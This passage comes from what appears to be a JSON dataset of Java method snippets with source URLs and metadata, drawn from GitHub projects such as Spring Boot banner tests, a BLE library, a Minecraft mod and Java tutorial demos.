execute(@NonNull Runnable command) {\n        handler.post(command);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/silentInstall/executor/MainExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": ["Executor"], "modifiers": ["public"]}}, {"id": 57612, "method_name": "processBefore", "class_name": "NoKeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processBefore(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    // Do Nothing\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/NoKeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 57613, "method_name": "processAfter", "class_name": "NoKeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processAfter(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    // Do Nothing\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/NoKeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 57614, "method_name": "getDescricao", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDescricao() {\n\t\treturn descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57615, "method_name": "setDescricao", "class_name": "OrdemServicoInput", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDescricao(String descricao) {\n\t\tthis.descricao = descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57616, "method_name": "getPreco", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getPreco() {\n\t\treturn preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57617, "method_name": "setPreco", "class_name": "OrdemServicoInput", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPreco(BigDecimal preco) {\n\t\tthis.preco = preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57618, "method_name": "getCliente", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ClienteIdInput", "snippet": "\tpublic ClienteIdInput getCliente() {\n\t\treturn cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57619, "method_name": "setCliente", "class_name": "OrdemServicoInput", "params": ["ClienteIdInput"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCliente(ClienteIdInput cliente) {\n\t\tthis.cliente = cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57620, "method_name": "executeProcedure", "class_name": "SyringaExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(SyringaBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/SyringaExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57621, "method_name": "main", "class_name": "Demo06Stream_limit", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u83b7\u53d6\u4e00\u4e2aStream\u6d41\n        String[] arr = {\"\u7f8e\u7f8a\u7f8a\",\"\u559c\u6d0b\u6d0b\",\"\u61d2\u6d0b\u6d0b\",\"\u7070\u592a\u72fc\",\"\u7ea2\u592a\u72fc\"};\n        Stream<String> stream = Stream.of(arr);\n        //\u4f7f\u7528limit\u5bf9Stream\u6d41\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u622a\u53d6,\u53ea\u8981\u524d3\u4e2a\u5143\u7d20\n        Stream<String> stream2 = stream.limit(3);\n        //\u904d\u5386stream2\u6d41\n        stream2.forEach(name-> System.out.println(name));\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo02/Stream/Demo06Stream_limit.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57622, "method_name": "writeToParcel", "class_name": "BleDevice", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeToParcel(Parcel dest, int flags) {\n        dest.writeParcelable(mDevice, flags);\n        dest.writeByteArray(mScanRecord);\n        dest.writeInt(mRssi);\n        dest.writeLong(mTimestampNanos);\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57623, "method_name": "describeContents", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int describeContents() {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57624, "method_name": "getName", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        if (mDevice != null)\n            return mDevice.getName();\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57625, "method_name": "getMac", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMac() {\n        if (mDevice != null)\n            return mDevice.getAddress();\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57626, "method_name": "getKey", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKey() {\n        if (mDevice != null)\n            return mDevice.getName() + mDevice.getAddress();\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57627, "method_name": "getDevice", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothDevice", "snippet": "    public BluetoothDevice getDevice() {\n        return mDevice;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57628, "method_name": "setDevice", "class_name": "BleDevice", "params": ["BluetoothDevice"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDevice(BluetoothDevice device) {\n        this.mDevice = device;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57629, "method_name": "getScanRecord", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getScanRecord() {\n        return mScanRecord;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57630, "method_name": "setScanRecord", "class_name": "BleDevice", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanRecord(byte[] scanRecord) {\n        this.mScanRecord = scanRecord;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57631, "method_name": "getRssi", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRssi() {\n        return mRssi;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57632, "method_name": "setRssi", "class_name": "BleDevice", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRssi(int rssi) {\n        this.mRssi = rssi;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57633, "method_name": "getTimestampNanos", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getTimestampNanos() {\n        return mTimestampNanos;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57634, "method_name": "setTimestampNanos", "class_name": "BleDevice", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTimestampNanos(long timestampNanos) {\n        this.mTimestampNanos = timestampNanos;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 57635, "method_name": "initElements", "class_name": "OakTanBarkBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakTanBarkBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57636, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakTanBarkBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57637, "method_name": "reset", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reset() {\n\t\tAnsiOutput.setEnabled(Enabled.DETECT);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57638, "method_name": "renderVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a} ${spring-boot.version} ${application.version}\".getBytes());\n\t\tString banner = printBanner(resource, \"10.2\", \"2.0\", null);\n\t\tassertThat(banner).startsWith(\"banner 1 10.2 2.0\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57639, "method_name": "renderWithoutVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a} ${spring-boot.version} ${application.version}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner 1  \");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57640, "method_name": "renderFormattedVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderFormattedVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a}${spring-boot.formatted-version}${application.formatted-version}\".getBytes());\n\t\tString banner = printBanner(resource, \"10.2\", \"2.0\", null);\n\t\tassertThat(banner).startsWith(\"banner 1 (v10.2) (v2.0)\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57641, "method_name": "renderWithoutFormattedVersions", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutFormattedVersions() {\n\t\tResource resource = new ByteArrayResource(\n\t\t\t\t\"banner ${a}${spring-boot.formatted-version}${application.formatted-version}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner 1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57642, "method_name": "renderWithColors", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithColors() {\n\t\tResource resource = new ByteArrayResource(\"${Ansi.RED}This is red.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.ALWAYS);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"\\u001B[31mThis is red.\\u001B[0m\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57643, "method_name": "renderWithColorsButDisabled", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithColorsButDisabled() {\n\t\tResource resource = new ByteArrayResource(\"${Ansi.RED}This is red.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.NEVER);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"This is red.\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57644, "method_name": "renderWith256Colors", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWith256Colors() {\n\t\tResource resource = new ByteArrayResource(\"${AnsiColor.208}This is orange.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.ALWAYS);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"\\033[38;5;208mThis is orange.\\u001B[0m\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57645, "method_name": "renderWith256ColorsButDisabled", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWith256ColorsButDisabled() {\n\t\tResource resource = new ByteArrayResource(\"${AnsiColor.208}This is orange.${Ansi.NORMAL}\".getBytes());\n\t\tAnsiOutput.setEnabled(AnsiOutput.Enabled.NEVER);\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"This is orange.\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57646, "method_name": "renderWithTitle", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithTitle() {\n\t\tResource resource = new ByteArrayResource(\"banner ${application.title} ${a}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, \"title\");\n\t\tassertThat(banner).startsWith(\"banner title 1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57647, "method_name": "renderWithoutTitle", "class_name": "ResourceBannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid renderWithoutTitle() {\n\t\tResource resource = new ByteArrayResource(\"banner ${application.title} ${a}\".getBytes());\n\t\tString banner = printBanner(resource, null, null, null);\n\t\tassertThat(banner).startsWith(\"banner  1\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57648, "method_name": "printBanner", "class_name": "ResourceBannerTests", "params": ["Resource", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "\tprivate String printBanner(Resource resource, String bootVersion, String applicationVersion,\n\t\t\tString applicationTitle) {\n\t\tResourceBanner banner = new MockResourceBanner(resource, bootVersion, applicationVersion, applicationTitle);\n\t\tConfigurableEnvironment environment = new MockEnvironment();\n\t\tMap<String, Object> source = Collections.singletonMap(\"a\", \"1\");\n\t\tenvironment.getPropertySources().addLast(new MapPropertySource(\"map\", source));\n\t\tByteArrayOutputStream out = new ByteArrayOutputStream();\n\t\tbanner.printBanner(environment, getClass(), new PrintStream(out));\n\t\treturn out.toString();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57649, "method_name": "getBootVersion", "class_name": "MockResourceBanner", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getBootVersion() {\n\t\t\treturn this.bootVersion;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 57650, "method_name": "getApplicationVersion", "class_name": "MockResourceBanner", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getApplicationVersion(Class<?> sourceClass) {\n\t\t\treturn this.applicationVersion;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 57651, "method_name": "getApplicationTitle", "class_name": "MockResourceBanner", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "\t\tprotected String getApplicationTitle(Class<?> sourceClass) {\n\t\t\treturn this.applicationTitle;\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ResourceBannerTests.java", "stars": "47572", "class_props": {"extends": "ResourceBanner", "implements": null, "modifiers": ["static"]}}, {"id": 57652, "method_name": "main", "class_name": "Demo03BufferedWriter", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        //System.out.println();\n        //1.\u521b\u5efa\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012\u5b57\u7b26\u8f93\u51fa\u6d41\n        BufferedWriter bw = new BufferedWriter(new FileWriter(\"10_IO\\\\c.txt\"));\n        //2.\u8c03\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5write,\u628a\u6570\u636e\u5199\u5165\u5230\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\n        for (int i = 0; i <10 ; i++) {\n            bw.write(\"\u4f20\u667a\u64ad\u5ba2\");\n            //bw.write(\"\\r\\n\");\n            bw.newLine();\n        }\n        //3.\u8c03\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5flush,\u628a\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e,\u5237\u65b0\u5230\u6587\u4ef6\u4e2d\n        bw.flush();\n        //4.\u91ca\u653e\u8d44\u6e90\n        bw.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo01/BufferedStream/Demo03BufferedWriter.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57653, "method_name": "main", "class_name": "CommentsInJava", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String args[]) {\n\n\t\t// this code will be connection to db\n\t\tSystem.out.println(\"Very complicated code starting..\");\n\n\n\t\t// disconect from db\n\n\t\t// System.out.println(\"hi\");\n\n\t\t/**\n\t\t\tSome more comments here..\n\t\t**/\n\n\t\t/*\n\n\t\t\tSystem.out.println(\"hi\");\n\n\t\t*/\n\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day2/CommentsInJava.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57654, "method_name": "isEditable", "class_name": "MessageTypeForumPost", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isEditable(Message message) {\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57655, "method_name": "isRemovable", "class_name": "MessageTypeForumPost", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isRemovable(Message message) {\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57656, "method_name": "isSpecialEditor", "class_name": "MessageTypeForumPost", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isSpecialEditor() {\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57657, "method_name": "getProcessMessageHeaderColor", "class_name": "MessageTypeForumPost", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getProcessMessageHeaderColor(Message message) {\n\t\treturn \"#E9C4F5\";\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57658, "method_name": "getPostUrl", "class_name": "MessageTypeForumPost", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPostUrl(String postId) {\n\t\treturn forum.getUrl() + \"/viewtopic.php?t=\" + postId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57659, "method_name": "messageDelete", "class_name": "MessageTypeForumPost", "params": ["ConnectionSet", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void messageDelete(ConnectionSet conSet, String... messageIds) throws BGException {\n\t\tfor (String messageId : messageIds)\n\t\t\tnew MessageDAO(conSet.getConnection()).deleteMessage(Utils.parseInt(messageId));\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57660, "method_name": "updateMessage", "class_name": "MessageTypeForumPost", "params": ["Connection", "DynActionForm", "Message"], 